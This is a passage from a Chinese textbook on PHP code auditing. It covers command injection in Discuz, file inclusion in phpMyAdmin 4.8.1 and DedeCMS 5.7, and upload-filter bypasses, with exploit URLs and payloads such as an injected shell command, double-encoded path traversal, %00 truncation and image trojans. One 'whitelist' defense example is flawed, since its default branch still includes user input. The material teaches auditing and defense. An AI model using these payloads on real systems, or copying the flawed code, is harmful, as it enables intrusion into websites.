## 6.4 命令执行审计CMS实践

### 6.4.1  实验：Discuz1.5命令执行审计

· 实验介绍

本实验将对Discuz进行代码审计工作，审计该CMS中数据库备份模块是否存在命令执行漏洞。该漏洞影响的版本为Discuz1.5至2.5版本，漏洞编号为CVE-2018-14729。

· 预备知识

参考6.3.2节：命令执行漏洞常见函数；6.3.4节：命令执行漏洞审计经验。

· 实验目的

掌握命令执行漏洞的审计方法。

· 实验环境

Windows操作系统主机；Discuz 1.5安装包；PhpStorm工具。

· 实验步骤

（1）审计阶段

对Discuz进行命令执行漏洞审计，全局搜索命令执行漏洞的常见函数。全局搜索shell_exec函数如图6-30所示，可以发现shell_exec函数存在三处，审计这三处函数是否存在可控参数。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image386.jpg)

图6-30 全局搜索shell_exec图

```
在source\admincp\admincp_db.php的287行存在shell_exec函数，代码如下：

@shell_exec($mysqlbin.'mysqldump --force --quick '.($db->version() > '4.1' ?'--skip-opt --create-options' : '-all').' --add-drop-table'.($_G['gp_extendins'] == 1 ?' --extended-insert' : '').''.($db->version() > '4.1' && $_G['gp_sqlcompat'] == 'MYSQL40' ?' --compatible=mysql40' : '').' --host="'.$dbhost.($dbport ? (is_numeric($dbport) ?' --port='.$dbport : ' --socket="'.$dbport.'"') : '').'" --user="'.$dbuser.'" --password="'.$dbpw.'" "'.$dbname.'" '.$tablesstr.' > '.$dumpfile);

该函数中传递的参数包括：$mysqlbin、$db、$dbhost、$dbport、$dbuser、$dupw、$tablesstr等。通过参数回溯追踪法，发现大部分参数都是通过读取config_global.php文件获取的，config_global.php文件部分代码如下：

$_config['db']['1']['dbhost'] = 'localhost';//连接数据库IP
$_config['db']['1']['dbuser'] = 'root';//连接数据库用户名
$_config['db']['1']['dbpw'] = 'root'; //连接数据库密码
$_config['db']['1']['dbcharset'] = 'gbk'; //连接数据库编码方式

代码中用户唯一可控参数为$tablesstr，使用敏感参数回溯法审计$tablesstr参数的传递过程。搜索该文件发现$tablesstr参数通过$tables进行遍历获得，代码如下：
```



```
$tablesstr = '';
foreach($tables as $table) {   //遍历tables变量
$tablesstr .= '"'.$table.'" ';
}

```

审计$tables变量的获取流程，source\admincp\admincp_db.php文件代码如图6-32所示。$tables变量在该文件的124行被赋值，数据流程为：

l 根据gp_type类型判断执行流程，若gp_type类型是discuz，则执行$tables = arraykeys2(fetchtablelist($tablepre), 'Name');

l 若gp_type类型是custom且 gp_setup为空，则执行查询语句并将执行结果赋值给$tables = unserialize($tables['svalue']);

l 若gp_type类型是custom且gp_setup不为空，将gp_customtables字段内容写入数据库表common_setting，再赋值给$tables。

至此漏洞产生原因是shell_exec()中的$tablesstr可控，导致代码注入。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image388.jpg)图6-31 $tables赋值代码

通过审计admincp_db.php文件，可发现若能够调用命令执行漏洞，需要的条件包括：

l $operation==’export’；

l $_GET[‘type’]==’custom’；

l $_GET[‘setup’]和$_GET[‘customtables’]非空；

l $_GET[‘method’]!=‘multivol’

才能够完成代码注入漏洞，给出函数调用栈，如图6-32所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image390.jpg)

图6-32 函数调用流程图

（2）命令执行漏洞利用

首先登陆Discuz管理平台，URL路径：http://ip/ discuz/admin.php。用户名为admin，密码password，登录页面如图6-33所示。对其进行数据库备份操作，然后使用BurpSuite抓取该数据包进行分析，数据包如图6-34所示。

数据包转包后，对HTTP的POST请求体中的customtables内容进行修改，其修改内容为customtables%5B%5D=pre_common_admincp_cmenu">aaa; echo helloworld > test.php。转发成功后，将成功执行命令：echo helloworld > test.php，在网站目录\discuz文件夹下创建恶意网站test.php文件。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image392.jpg)

图6-33 Discuz管理平台页面

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image394.jpg)

图6-34 数据包拦截图

## 6.5 单元小结

本单元主要学习了代码审计中的代码执行漏洞与命令执行漏洞，通过这两种漏洞的常见漏洞函数进行列举，使读者熟悉常见的审计代码执行与命令执行漏洞的方法。与此同时，给出存在漏洞的CMS审计流程，包括：YCCMS、YzmCMS、Discuz。

本单元要求读者着重掌握代码执行、命令执行漏洞中常见函数的PHP代码形式，并通过对小型CMS的代码走读审计代码其中存在的漏洞。

# 单元7 文件包含漏洞审计

本单元介绍了代码审计中文件包含漏洞审计，其主要分为四个部分进行介绍。

第一部分主要介绍文件包含漏洞的基础知识，包括：文件包含漏洞的基本概念、漏洞常见函数的代码分析、审计方法、漏洞防御方法等。

第二部分介绍文件包含漏洞PHP代码，让读者了解漏洞代码案例。

第三部分介绍常见的限制后缀名的染过方式，包括：%00、超过目录限制、符号绕过等。

第四部分使用phpmyadmin4.8.1、织梦CMS5.7进行文件包含漏洞审计实践。

**单元构图：**

**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image396.jpg)**

**单元目标：**

\1.  熟悉文件包含漏洞的常见高危函数；

\2.  了解文件包含漏洞的挖掘技巧；

\3.  掌握文件包含漏洞的常见代码审计方法；

\4.  掌握文件包含漏洞的防御方法。

## 7.1 文件包含漏洞挖掘

### 7.1.1 文件包含漏洞简介

很多Web网站在开发时都会使用文件包含方式将公用函数包含进来，其优点是公用代码可以写在一个单独的文件下，其他文件在使用时只需包含调用即可，代码无需重复编写减少代码量。很多程序在使用文件包含功能时，将包含的文件参数通过URL方式动态包含文件，这种方式在为开发带来便利的同时也产生了文件包含漏洞。

文件包含漏洞是指应用程序后台代码在调用文件包含函数时，函数参数未经过过滤或严格定义，同时给参数可以被攻击者篡改，导致后台代码包含了恶意文件。文件中将包含恶意代码并被执行，从而达到攻击目的。文件包含漏洞可能出现在JSP、PHP、ASP等语言中，JSP和ASP语言中只存在本地文件包含漏洞，而PHP语言则可能存在本地文件包含和远程文件包含漏洞两种，本单元将以PHP语言进行讲解。

### 7.1.2 文件包含漏洞审计经验

在对代码进行白盒审计过程中，文件包含漏洞点主要出现的功能点是：模板加载、模块加载、cache调用。

在挖掘漏洞白盒审计时，主要需要确定如下几点：

（1）挖掘文件包含漏洞可以先跟踪一下程序运行流程，查看代码中模块加载时包含的文件是否可控；

（2）在整体的应用程序中直接搜索四个文件包含函数： include()、include_once()、require()、require_once()来回溯查看传递变量是否可控。

### 7.1.3 文件包含漏洞防御

本小节给出文件包含漏洞的防御方法，其主要包括如下几点：

（1）白名单过滤

在修复文件包含漏洞时，可以在代码层进行文件过滤，将包含的参数设置为白名单，例如：网站需要包含的文件只有index.php、home.php、admin.php这三个文件，就可以将这三个文件的名称定义为白名单，案例代码如下：



<?php

  $filename = $_GET['filename'];

  switch($filename){

​    case 'index':

​    case 'home':

​    case 'admin':

​      include '/var/www/html'.$filename.'.php';

​    break;

​    default:

​      include '/var/www/html'.$filename.'.php';

  }

?>



（2）服务器安全配置

服务器安全配置主要涉及以下两个方面：

l 修改PHP的配置文件，将open_basedir的值设置为可以包含的特定目录，后面要加/，例如：open_basedir=/var/www/html/。

l 修改PHP的配置文件，关闭allow_url_include，可以防止远程文件包含。

## 7.2 文件包含漏洞案例

  本小节将对常见的文件包含漏洞进行介绍，通过对存在漏洞的PHP代码进行白盒审计，从而让读者理解文件包含漏洞的代码形式。文件包含是指包含文件的位置在本地的服务器，通过URL的形式直接读取文件或执行恶意代码，漏洞案例代码如下：



<?php

if ("$_GET[page]") {

  include "$_GET[page]";

} else {

  include "home.php";}?>



  上述代码通过HTTP的GET方式传递参数page，由于page参数未进行过滤，可以通过该参数查看文件内容，输入路径：http://192.168.0.11/main.php?page=111.txt访问网站根路径下111.txt文件，如图7-1所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image398.gif)

图7-1 本地文件包含测试图

还可以通过文件包含功能执行任意扩展名的文件代码，假设111.txt文件内容为<?php phpinfo();?>。利用文件包含漏洞包含111.txt文件，就可以执行文件中的PHP代码并输出phpinfo信息，如图7-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image400.gif)

图7-2 本地文件包含测试图2

## 7.3 文件包含漏洞绕过

本小节将对文件包含漏洞中后缀名防御的绕过方式进行介绍，常见的绕过方式分为本地文件包含和远程文件包含两类，具体可包括：%00阶段、……截断、./././.截断、符号截断等。

### 7.3.1 扩展名过滤绕过（本地文件包含）

在常见的本地文件包含漏洞中，存在通过限制文件扩展名的方式防御该漏洞，而绕过文件扩展名常用的方法包括两种分别是：%00、路径长度截断绕过。

（1）%00绕过

%00通常被程序识别为值的结束符，当传递参数末尾包含%00时，其后面的数据将被直接忽略，导致攻击者可以利用此方式将扩展名截断绕过扩展名过滤。

该方法绕过条件包括：magic_quotes_gpc=off和PHP版本低于5.3.4。

漏洞代码案例如下：



<?php

$filename=$_GET['filename'];

include($filename.".html");?>



上述PHP代码将文件名（$filename）与“.html”进行拼接，由于目前PHP版本小于5.3.4且魔术引号GPC关闭状态，可以使用%00截断绕过此类拼接方式。输入路径为：http://127.0.0.1/include-labs/houzhuiraoguo.php?filename=../../MySQL/my.ini%00

通过%00截断了后面的.html扩展名过滤，成功读取了my.ini文件（MySQL配置文件）内容。访问后页面如图7-3所示，其成功绕过后缀名限制读取文件内容。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image402.jpg)

图7-3 %00截断测试图

（2）路径长度截断绕过

路径长度绕过是由于操作系统长度的限制，将输入的路径参数长度超过其最大的路径长度，从而使系统无法识别后面的文件路径，导致绕过扩展名过滤。

该方法绕过条件包括：Windows系统目录的最大路径长度为256B，Linux系统下目录的最大路径长度为4096B。绕过的方式可以使用多个“/./././././././././././././././”或“……………………………”的方式超过最大目录路径长度。在Windows系统下需要240个连续的“.”或“./”截断，在Linux操作系统下需要2038个“./”进行截断。

### 7.3.2 扩展名过滤绕过（远程文件包含）

对于限制后缀名的远程文件包含漏洞，通常存在三种绕过方法：问号绕过（?）、井号绕过（#）、空格绕过（ ），本小节将对次类型绕过进行介绍。

（1）  问号绕过

通过在URL路径后加入问号（?）并添加HTML字符串，问号后的扩展名.html将被作为查询，从而绕过扩展名过滤。

漏洞代码案例如下：



<?php

$filename=$_GET[‘filename’];

include($filename.”.html”);?>



输入路径为：http://127.0.0.1/test.php?filename=http://192.168.0.11/1.txt?请求后成功执行1.txt文件，如图7-4所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image404.gif)

图7-4 问号绕过测试图

（2）  其他绕过

l 井号绕过：井号（#）后添加HTML字符串将截断后面的扩展名.html从而绕过扩展名过滤，其中井号的URL编码为%23。

输入路径为：http://127.0.0.1/include-labs/houzhuiraoguo.php?filename=http://192.168.0.11/1.txt%23

l 空格绕过：与上述符号绕过方法类似，输入路径：http://127.0.0.1/include-labs/houzhuiraoguo.php?filename=http://192.168.0.11/1.txt%20也可绕过扩展名过滤。

## 7.4 文件包含漏洞审计CMS实践

### 7.4.1  实验：phpmyadmin4.8.1文件包含审计

· 实验介绍

本实验将对phpmyadmin4.8.1进行代码审计工作，审计该CMS中是否存在文件包含漏洞。该漏洞影响的版本为phpmyadmin4.8.0至4.8.1版本，漏洞编号为CVE-2018-12613。

· 预备知识

参考7.1.3节：文件包含漏洞审计经验；7.2节：文件包含漏洞案例。

· 实验目的

掌握文件包含漏洞的审计方法。

· 实验环境

Windows操作系统主机；phpmyadmin4.8.1安装包；PhpStorm工具。

· 实验步骤

（1） 审计阶段

```
对phpmyadmin进行文件包含漏洞审计，全局搜索文件包含漏洞的常见函数。全局搜索include函数如图7-5所示，可以发现在index.php文件中include函数，审计该函数是否存在可控参数。index.php文件中存在include $_REQUEST['target']，可通过HTTP请求传递参数target。
```

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image406.jpg)

图7-5 全局搜索include函数图

```
双击index.php页面，其中包含target参数变量，同时通过敏感参数回溯法审计该target变量是否被过滤，通过审计该变量在传递过程并没有任何过滤，其代码为：
```



```
if (! empty($_REQUEST['target'])
&& is_string($_REQUEST['target']) //target参数值为空
&& ! preg_match('/^index/', $_REQUEST['target'])//不匹配index正则表达式
&& ! in_array($_REQUEST['target'], $target_blacklist)//在黑名单中
&& Core::checkPageValidity($_REQUEST['target'])//target参数是否有效检验
) {
include $_REQUEST['target'];
exit;}
```



目前漏洞利用的关键是能够绕过上述代码的if判断。其首先判断target参数是否为字符串，再检测target不能以index开头，再判断target参数不能在$target_blacklist数组里，$target_blacklist数组内容为：



```
$target_blacklist = array (
'import.php', 'export.php'//黑名单为import.php和export.php文件
);
```



前三个条件可以轻松绕过，最后需绕过Core类中的checkPageValidity检查。绕过该方法检查的关键在于：程序对传入的target参数值进行了url解码，可以使用二次URL编码的方式绕过方法检查，利用文件包含漏洞查看敏感文件，checkPageValidity函数代码如图7-15所示。



```
public static function checkPageValidity(&$page, array $whitelist = [])
{
if (empty($whitelist)) {//若$whitelist为空则赋值为$goto_whitelist
$whitelist = self::$goto_whitelist;}
if (! isset($page) || !is_string($page)) {/
return false;} /若$page未设置或不是string则返回false
if (in_array($page, $whitelist)) {
return true;}//若$page在$whitelist数组中则返回true
$_page = mb_substr($page,0,mb_strpos($page . '?', '?'));//截取$page
if (in_array($_page, $whitelist)) {//若$_page在$whitelist数组中则返回true
return true;}
$_page = urldecode($page);//对$page进行URL编码并赋值给$_page
$_page = mb_substr($_page,0,mb_strpos($_page . '?', '?'));
if (in_array($_page, $whitelist)) {//若$_page在$whitelist数组中则返回true
return true;}
return false;}
```



至此可以看到漏洞产生的原因是由于index.php文件中的$page可控且过滤不严格，导致可以通过二次URL编码方式绕过检测机制，从而利用文件包含漏洞。

（2）文件包含漏洞利用

访问http://ip/phpmyadmin/index.php，然后输入用户名root，密码root，登录页面。构造攻击载荷Payload为：

http://ip/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../windows/win.ini

其中%253f通过URL二次解码后，%253f别解码为符号“?”，使用文件包含漏洞访问win.ini文件内容。攻击效果如图7-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image408.jpg)

图7-6 攻击效果图

### 7.4.2  实验：织梦cmsV5.7包含Cache审计

· 实验介绍

本实验将对织梦cmsV5.7进行代码审计工作，审计该CMS中是否存在文件包含漏洞。该CMS的sys_verifies.php文件中使用require_once函数进行文件包含，同时包含的Cache文件可被攻击者进行修改从而执行恶意代码。

· 预备知识

参考7.1.3节：文件包含漏洞审计经验；7.2节：文件包含漏洞案例。

· 实验目的

掌握文件包含漏洞的审计方法。

· 实验环境

Windows操作系统主机；织梦CMS V5.7安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

```
对织梦CMS5.7进行文件包含漏洞审计，搜索sys_vertifies.php中文件包含漏洞的常见函数require_once。可以发现该程序210行使用require_once包含缓存文件$cacheFiles，当传递参数为down时，将包含文件datat/modifytmp.inc，代码为：

else if($action=='down')                    //当$action为down时
{
$cacheFiles = DEDEDATA.'/modifytmp.inc';
require_once($cacheFiles);              //文件包含modifytmp.inc
if($fileConut==-1 || $curfile > $fileConut)
{ShowMsg("已下载所有文件<br /><a href='sys_verifies.php?action=apply'>[直接替换文件]</a> &nbsp; <a href='#'>[我自己手动替换文件]</a>","javascript:;");
exit();}
…省略…
}
else if ($action == 'getfiles')             //当$action为'getfiles'时
{    if(!isset($refiles))
{   ShowMsg("你没进行任何操作！","sys_verifies.php");
exit();}
$cacheFiles = DEDEDATA.'/modifytmp.inc';//定义写入文件名为modifytmp.inc
$fp = fopen($cacheFiles, 'w');          //开启文件且有写权限
fwrite($fp, '<'.'?php'."\r\n");         //写入内容
fwrite($fp, '$tmpdir = "'.$tmpdir.'";'."\r\n");//写入内容
$dirs = array();
$i = -1;
$adminDir = preg_replace("#(.*)[\/\\\\]#", "", dirname(__FILE__));
foreach($refiles as $filename)         //遍历$refiles变量
{   $filename = substr($filename,3,strlen($filename)-3);//截取文件名
if(preg_match("#^dede/#i", $filename)) //如果匹配正则表达式#^dede/#i
{$curdir = GetDirName( preg_replace("#^dede/#i", $adminDir.'/', $filename) );//替换字符串
} else {
$curdir = GetDirName($filename);//否则直接获取文件名}
if( !isset($dirs[$curdir]) ) {//如果$dirs[$curdir]未设置
$dirs[$curdir] = TestIsFileDir($curdir);}//则调用TestIsFileDir函数
$i++;
fwrite($fp, '$files['.$i.'] = "'.$filename.'";'."\r\n");}
//向modifytmp.inc文件中写入文件
fwrite($fp, '?'.'>');
fclose($fp);//关闭流
…省略…

虽然上述代码包含文件的名称无法控制，但是可以查看文件modifytmp.inc能够被写入恶意代码。若可被写入，则可以通过包含漏洞执行该文件恶意代码。当$action为getfiles时，程序将向modifytmp.inc文件中写入内容，其内容是url中过去的refiles参数且该参数将是一个数组。使用foreach函数遍历该数组并写入modifytmp.inc中。
如果要写入文件内容还需要满足条件是：
l  绕过preg_match("#^dede/#i",$filename)；
l  绕过TestisFileDir函数；
l  执行fwrite($fp,'$files['.$i.']="'.$filename.'";'."\r\n")即可。
```

（2）  文件包含漏洞利用

登陆织梦管理员后台，用户名密码均为admin，URL为：http://ip/dedevms57/login.php。如图7-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image410.jpg)

图7-7 管理员后台登录页面

输入构造的Payload：http://ip /dedecms57/dede/sys_verifies.php?action=getfiles&refiles[]=\";phpinfo();//向modifytmp.inc文件中写入恶意脚本，访问成功后查看该文件是否写入恶意脚本，如图7-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image412.jpg)

图7-8 恶意代码写入图

当$action为down时将文件包含modifytmp.inc文件，并执行恶意代码。输入的URL路径为：http://ip/dedecms57/dede/sys_verifies.php?action=down&curfile=1，访问即通过如图7-9所示，成功触发文件包含漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image414.gif)

图7-9 文件包含漏洞测试图

## 7.5 单元小结

本单元主要学习了代码审计中的文件包含漏洞，通过对常见漏洞函数进行列举，使读者熟悉常见的审计文件包含漏洞的方法。与此同时，给出存在漏洞的CMS审计流程，包括：phpmyadmin和织梦CMS。本单元要求读者着重掌握文件包含漏洞中常见函数的PHP代码形式，并通过对小型CMS的代码走读审计代码其中存在的漏洞。



 

# 单元8 任意文件操作漏洞审计

本单元介绍了代码审计中任意文件操作漏洞审计，其主要分为五个部分进行介绍。

第一部分介绍文件上传漏洞的审计方法，包括：文件上传漏洞的基本知识、文件上传漏洞常见函数的代码分析及审计方法、FineCMS文件上传漏洞实践。

第二部分介绍文件写入漏洞的审计方法，包括：文件写入漏洞的基本知识、文件写入漏洞的常见函数及挖掘经验、74CMS 3.0文件写入漏洞实践。

第三部分介绍文件读取（下载）漏洞的审计方法，包括：文件读取漏洞的基本知识、文件下载漏洞的基本知识、文件读取（下载）漏洞的代码审计及挖掘经验、MetInfo6.0文件读取漏洞实践。

第四部分介绍文件删除漏洞的审计方法，包括：文件删除漏洞的基本知识、文件删除漏洞的常见函数、文件删除漏洞的代码审计及挖掘经验、74CMS 3.0文件删除漏洞实践。

第五部分介绍文件操作漏洞的防御方法，包括：通用文件操作漏洞防御、文件上传漏洞的防御方法。

**单元构图**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image416.jpg)

**单元目标：**

\1.  掌握文件上传漏洞的审计方法；

\2.  掌握文件写入漏洞的审计方法；

\3.  掌握文件读取（下载）的审计方法；

\4.  掌握文件删除漏洞的审计方法；

\5.  掌握文件操作漏洞的防御。

## 8.1 文件上传漏洞挖掘与实践

### 8.1.1 文件上传漏洞简介

文件上传漏洞往往出现在Web应用的上传功能中，如果应用程序对用户上传的文件无过滤功能或过滤不够严格，将导致攻击者可以通过该漏洞上传图片木马、病毒等有害文件，当执行服务器已上传的木马后，将控制该服务器。近几年文件上传漏洞出现的频次并不高，这主要是由于目前文件上传功能过于单一且过滤功能较为成熟。

文件上传漏洞危害极大，这是因为利用文件上传漏洞可以直接将恶意代码上传至服务器上，可能会造成服务器的网页被篡改、网站被挂马、服务器被远程控制、被安装后门等严重后果。

### 8.1.2 文件上传漏洞挖掘经验

文件上传漏洞的审计较为简单，从网站功能进行审计而言，由于网站中上传功能点较少。同时，如果网站开发使用Web框架审计，其文件上传模块通常都将被定义为一个公用类进行调用，在白盒审计过程中，只需对文件上传公用类进行审计即可。

从函数搜索而言，PHP代码的文件上传函数会使用move_uploaded_file()函数，快速挖掘文件上传漏洞只需全局搜索函数名，定位需要审计的代码位置，同时审计该函数上传文件的代码是否存在限制或过滤不严格的情况可绕过。

### 8.1.3 文件上传漏洞绕过

本小节将对文件上传过滤的绕过进行介绍。

（1）  未过滤或本地过滤

该类型指的是本地服务器未对上传文件进行过滤，攻击者可通过文件上传功能上传PHP恶意代码并直接利用，下面给出上传文件的代码案例：



<?php

  move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])

?>



move_uploaded_file(file, newloc)函数传递两个参数，file参数指要上传的文件名，newloc指规定上传文件存储的位置。该文件将直接把上传的临时文件拷贝到新的文件存储位置。

在QYKCMS是青云客开发的一款轻量级网站系统，其4.3.2版本曾经被发现有未过滤文件上传漏洞，案例代码如下：



case 'none':

//文件名小写

$typename=strtolower(pathinfo($_FILES['file']['name'],PATHINFO_EXTENSION));

//文件名拼接

$filename=date('dHis').'_'.randomkeys(6).'.'.$typename;

//文件名上传路径

$path='../'.$website['upfolder'].setup_uptemp.$filename;

//上传文件

move_uploaded_file($_FILES['file']['tmp_name'],$path);

$res='http://'.$website['setup_weburl'].'/'.$website['upfolder'].setup_uptemp.'|'.$filename;

break;



上述代码中对上传的文件未进行过滤，从而导致攻击者可直接构造木马文件进行上传。

有些应用会使用前台JS代码对上传文件类型进行过滤，但是后台服务器代码依旧未进行过滤。案例代码如下：



<script type="text/javascript">

  function checkFile() {

​    var file = document.getElementsByName('upload_file')[0].value;

​    var allow_ext = ".jpg|.png|.gif"; //定义允许上传的文件类型

​    //提取上传文件的类型

​    var ext_name = file.substring(file.lastIndexOf("."));

​    //判断上传文件类型是否允许上传

​    if (allow_ext.indexOf(ext_name) == -1) {

​      var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;

​      alert(errMsg);

​      return false;}}

</script>



  但是这种前台代码校验很容易通过数据包拦截转发或修改JS代码结果的方式进行绕过，从而上传恶意代码文件，此类型也将是一种无过滤的情况。

（2）  黑名单过滤不严格绕过

黑名单过滤通常是指由于后台代码过滤不严格，导致的可以通过修改文件后缀名绕过方式。后台代码的黑名单过滤通常包括：正则表达式过滤不严格，黑名单数组过滤可绕过。

常见可上传文件格式如表8-1所示，每种脚本语言支持的文件类型都不尽相同。

表8-1 文件格式后缀表

| **脚本语言** | **文件格式后缀**              |
| ------------ | ----------------------------- |
| Asp脚本      | asa、cer、cdx                 |
| Aspx脚本     | ashx、asmx、ascx              |
| Php脚本      | php2、php3、php4、php5、phtml |
| Jsp脚本      | jspx、jspf                    |

l 正则表达式过滤不严格案例：



$savefile=preg_replace("/(php|phtml|php3|php4|jsp|exe|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i","_\\1\\2",$savefile);



上述代码使用正则表达式匹配常见的上传文件名后缀，同时进行字符串替换操作。但是，此过滤方式很容造成后缀名过滤不严而导致绕过正则表达式的情况。例如，IIS支持的ASP语言可运行的脚本包括：asa、cer、cdx，上述正则表达式中匹配后缀并不完全，将导致使用.cdx脚本绕过完成文件上传漏洞。

l 黑名单数组过滤绕过案例：



if (isset($_POST['submit'])) {

  if (file_exists($UPLOAD_ADDR)) {

​     **$deny_ext** = array('.asp','.aspx','.php','.jsp');

​    $file_name = trim($_FILES['upload_file']['name']);

​    $file_name = deldot($file_name);//删除文件名末尾的点

**$file_ext** = strtolower($file_ext); //转换为小写

​    if(**!in_array($file_ext, $deny_ext)**) {

​      if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR. '/' . $_FILES['upload_file']['name'])) {

​         $img_path = $UPLOAD_ADDR .'/'. $_FILES['upload_file']['name'];

​         $is_upload = true;}

​    } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';}

  } else {$msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！';}}



上述代码首先定义了黑名单数组$deny_ext，然后对文件名进行处理后赋值给$file_ext变量，随后判断$file_ext是否属于黑名单数组$deny_ext中的元素，若不属于该数组元素则进行文件上传。上述功能代码主要存在两个问题：黑名单数组不完全可绕过、验证扩展名不严格可绕过。

如果上传文件的名称为“1.php ”（1.php后存在空格），则可绕过in_array()函数并成功上传恶意脚本文件。

（3）  Content-Type校验绕过

Content-Type是HTTP协议消息头中的一个字段，其主要用来表示请求中的媒体类型信息，很多网站后台代码将对Content-type进行校验，从而确定文件上传的类型。

常见文件相关的Content-type类型如表8-2所示。

表8-2 Content-type类型表

| **Content-type类型** | **类型名称** |
| -------------------- | ------------ |
| text/html            | HTML格式     |
| image/gif            | gif图片格式  |
| image/jpeg           | jpg图片格式  |
| image/png            | png图片格式  |
| text/plain           | 纯文本格式   |
| text/xml             | XML格式      |

Content-Type校验案例代码如下：



if (isset($_POST['submit'])) {

  if (file_exists($UPLOAD_ADDR)) {

​    if ((**$_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif'**)) {

​      if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) {

​        $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name'];

​         $is_upload = true;}

​    } else {$msg = '文件类型不正确，请重新上传！';}

  } else {$msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！';}}



  上述代码将对不同的Content-Type进行校验，其中包括：gif、png、jpg格式，后台将对其Content-Type判断从而确定文件是否允许上传。但是Content-Type字段可以通过BurpSuite数据包抓取进行篡改，这样就可以绕过该过滤方式。

  Web网站中上传test.php文件内容为<?php phpinfo();?>，然后使用BurpSuite拦截数据包如图8-1所示，将抓取的数据包Content-Type中application/octet-stream修改为image/gif，从而上传PHP恶意代码文件。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image418.jpg)

图8-1 数据包修改图

（4）  文件头过滤绕过

各种文件都有特定的文件头格式，程序在开发过程中，开发者可通过校验上传文件的文件头检测文件类型，常见的文件头格式如表8-3所示。

表8-3 图片文件头表

| **图片类型** | **文件头格式**              |
| ------------ | --------------------------- |
| JPEG图片     | 0xFFD8FF                    |
| PNG图片      | 0x89504E470D0A1A0A          |
| GIF图片      | 47 49 46 38 39 61（GIF89a） |

但是这种校验方式也可以被绕过，其主要通过在木马文件头部添加对应的文件头，这样既可以绕过此类方式的校验，又不影响该木马文件的正常运行。

文件头校验案例代码如下：



function isImage($filename){

  $types = '.jpeg|.png|.gif';

  if(file_exists($filename)){

​    $info = getimagesize($filename);

​    $ext = image_type_to_extension($info[2]);

​    if(stripos($types,$ext)){return $ext;

​    }else{return false;

​    }}else{return false;}}



上述代码使用getimagesize函数获取文件类型，并使用image_type_to_extension函数获得对应文件格式，在通过stripos函数判断该文件的是否为jpeg、png、gif。

其中getimagesize函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条E_WARNING级的错误信息，该函数主要的检查文件格式方式是通过文件头的方式获取文件类型。

l 修改文件头绕过

很多恶意上传文件可通过修改文件头的方式误导getimagesize函数，从而令该函数判定上传文件为图片格式，通过在PHP文件头中添加“GIF89a”可使getimagesize函数误认为该PHP文件为gif图片，从而绕过检测。

l 制作图片木马绕过

可准备两个文件，分别是正常图片a.jpg、木马代码a.txt内容为<?php phpinfo();?>。通过使用copy命令将两个文件进行合并到test.php文件中，这样该文件将是一个带有图片头标识的图片木马，从而成功绕过getimagesize函数检测成功上传图片木马。



copy命令为：copy a.jpg/b + a.txt/a test.php



（5）  文件截断%00上传绕过白名单

文件截断上传漏洞的主要原因是存在%00字符，当PHP的版本低于5.3.4且magic_quotes_gpc为off的状态时，带有%00字符将被程序识别为结束符，从而该字符后的数据直接被忽略，造成文件上传被截断的情况。上传时如果上传的文件路径可控，即可通过%00截断进行木马上传。

文件截断案例代码如下：



if(isset($_POST['submit'])){

  $ext_arr = array('jpg','png','gif');

  $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);

  if(in_array($file_ext,$ext_arr)){

​    $temp_file = $_FILES['upload_file']['tmp_name'];

​    **$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;**

​    if(move_uploaded_file($temp_file,$img_path)){$is_upload = true; }

​    else{$msg = '上传失败！';}}

  else{$msg = "只允许上传.jpg|.png|.gif类型文件！";}}



上述代码中，首先使用白名单数组进行校验，然后当为文件进行保存之前，直接拼接保存文件路径，此处可使用%00截断的方式拼接文件保存位置并将上传图片修改为PHP可执行文件。

上传的文件为test.php内容为<?php phpinfo();?>，上传过程中使用BurpSuite进行数据包拦截，拦截数据包如图8-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image420.jpg)

图8-2 %00截断数据包图

### 8.1.4 实验：FineCMS文件上传漏洞审计

· 实验介绍

